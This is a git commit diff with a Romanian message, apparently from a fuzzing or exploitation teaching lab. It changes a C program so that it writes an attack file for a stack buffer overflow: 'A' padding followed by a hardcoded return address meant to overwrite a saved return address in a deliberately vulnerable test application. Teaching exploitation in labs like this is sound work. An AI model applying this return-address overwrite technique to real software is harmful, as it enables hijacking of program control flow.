336d76e94ebec95596346c36366e70eed2e4c1c9
Adrian Colesa <acolesa@ACOLESA-L1.bitdefender.biz>
2022-06-10 14:35:11 +0300

    Adugare functii de dump stiva. Modificare aplicatie vulnerabila, cu functie cu cod vulnerabil. Adugare cod python de creare fisier de atac

--- vlad-iulian-pop-fuzzing/create-attack-binary-file.c
+++ vlad-iulian-pop-fuzzing/create-attack-binary-file.c
@@ -11,10 +11,11 @@
 
 int main(int argc, char **argv)
 {
-    char *msg = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
+    char *msg = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
     int fd;
     int msg_len;
     unsigned int written_bytes;
+    unsigned int   return_addr = 0x5655626d;
 
     if (argc != 2) {
         printf("USAGE: %s <file_name>\n", argv[0]);
@@ -28,13 +29,18 @@ int main(int argc, char **argv)
         exit(2);
     }
 
-    msg_len = strlen(msg);
+    msg_len = strlen(msg) + sizeof(return_addr);
     if (write(fd, &msg_len, sizeof(msg_len)) != sizeof(msg_len)) {
         perror("Cannot write msg len into file");
         exit(3);
     }
 
-    if ((written_bytes = write(fd, msg, msg_len)) < 0) {
+    if ((written_bytes = write(fd, msg, strlen(msg))) < 0) {
+        perror("Cannot write msg into file");
+        exit(4);
+    }
+
+    if ((written_bytes = write(fd,&return_addr, sizeof(return_addr))) < 0) {
         perror("Cannot write msg into file");
         exit(4);
     }
